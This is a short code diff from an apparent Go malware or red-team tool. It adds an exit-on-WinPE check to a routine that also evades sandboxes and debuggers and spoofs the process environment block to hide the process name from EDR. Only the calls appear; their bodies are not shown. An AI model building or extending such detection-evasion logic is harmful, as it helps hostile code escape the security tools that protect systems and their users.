@@ -4,6 +4,7 @@
 package evasion
 
 func runEvasion() {
+	exitIfWinPE()
 	evadeSandbox()
 	evadeDebugger()
 	spoofPEB()         // change visible process name/cmdline before any EDR check
